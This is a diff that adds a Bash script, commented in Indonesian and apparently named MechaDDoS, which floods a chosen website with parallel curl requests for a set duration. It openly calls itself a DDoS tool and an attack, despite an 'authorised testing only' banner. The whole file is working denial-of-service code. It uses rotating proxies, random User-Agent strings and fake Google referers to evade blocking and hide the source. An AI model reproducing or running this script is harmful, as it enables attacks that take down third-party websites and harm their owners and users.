@@ -1,0 +1,124 @@
+#!/bin/bash
+# Tools DDoS untuk Website - By MechaPowerBot
+# Fitur: Multi-threading, Proxy Support, User-Agent Random, Custom Header, dll.
+
+BANNER="
+============================================
+   🔥 MechaDDoS - Website Stress Tester 🔥
+         Hanya untuk Pengujian Resmi
+============================================
+"
+
+show_help() {
+    echo "Penggunaan: $0 -u <URL> -t <durasi> -r <jumlah request> -p <file proxy> -w <jumlah thread>"
+    echo ""
+    echo "Opsi:"
+    echo "  -u <URL>          Target URL (contoh: http://example.com)"
+    echo "  -t <detik>        Durasi serangan dalam detik (default: 60)"
+    echo "  -r <jumlah>       Jumlah request per thread (default: 1000)"
+    echo "  -p <file>         File daftar proxy (format: ip:port per baris)"
+    echo "  -w <thread>       Jumlah thread (default: 5)"
+    echo "  -h                Tampilkan bantuan ini"
+    echo ""
+    echo "Contoh: $0 -u http://target.com -t 120 -r 500 -p proxy.txt -w 10"
+}
+
+# Default values
+DURASI=60
+REQUESTS=1000
+THREAD=5
+PROXY_FILE=""
+URL=""
+
+while getopts "u:t:r:p:w:h" opt; do
+    case $opt in
+        u) URL=$OPTARG ;;
+        t) DURASI=$OPTARG ;;
+        r) REQUESTS=$OPTARG ;;
+        p) PROXY_FILE=$OPTARG ;;
+        w) THREAD=$OPTARG ;;
+        h) show_help; exit 0 ;;
+        *) show_help; exit 1 ;;
+    esac
+done
+
+if [ -z "$URL" ]; then
+    echo "❌ URL harus ditentukan!"
+    show_help
+    exit 1
+fi
+
+echo "$BANNER"
+echo "Target: $URL"
+echo "Durasi: $DURASI detik"
+echo "Request per thread: $REQUESTS"
+echo "Jumlah thread: $THREAD"
+if [ -n "$PROXY_FILE" ]; then
+    echo "Proxy file: $PROXY_FILE"
+    # Baca proxy ke array
+    mapfile -t PROXIES < "$PROXY_FILE"
+    echo "Total proxy: ${#PROXIES[@]}"
+else
+    echo "Proxy: Tidak digunakan"
+fi
+echo ""
+
+# Fungsi untuk menghasilkan User-Agent acak
+random_ua() {
+    ua_list=(
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15"
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+        "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
+        "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
+    )
+    echo "${ua_list[$RANDOM % ${#ua_list[@]}]}"
+}
+
+# Fungsi serangan
+attack() {
+    local thread_id=$1
+    local url=$2
+    local max_requests=$3
+    local proxy_list=("${!4}")
+    
+    for ((i=1; i<=max_requests; i++)); do
+        # Pilih proxy acak jika ada
+        proxy_opt=""
+        if [ ${#proxy_list[@]} -gt 0 ]; then
+            proxy_idx=$((RANDOM % ${#proxy_list[@]}))
+            proxy="--proxy http://${proxy_list[$proxy_idx]}"
+        else
+            proxy=""
+        fi
+        
+        ua=$(random_ua)
+        # Tambahkan header acak untuk variasi
+        referer="https://www.google.com/search?q=$RANDOM"
+        
+        curl -s -o /dev/null -w "Thread $thread_id: Request $i sent\n" \
+            $proxy \
+            -A "$ua" \
+            -e "$referer" \
+            --connect-timeout 5 \
+            --max-time 10 \
+            "$url" &
+    done
+    wait
+}
+
+export -f random_ua attack
+
+echo "🔥 Memulai serangan selama $DURASI detik..."
+end_time=$((SECONDS + DURASI))
+
+while [ $SECONDS -lt $end_time ]; do
+    for ((t=1; t<=THREAD; t++)); do
+        attack $t "$URL" "$REQUESTS" PROXIES[@] &
+    done
+    wait
+    echo "⏳ Siklus selesai, melanjutkan..."
+done
+
+echo "✅ Serangan selesai! Server target telah diuji."
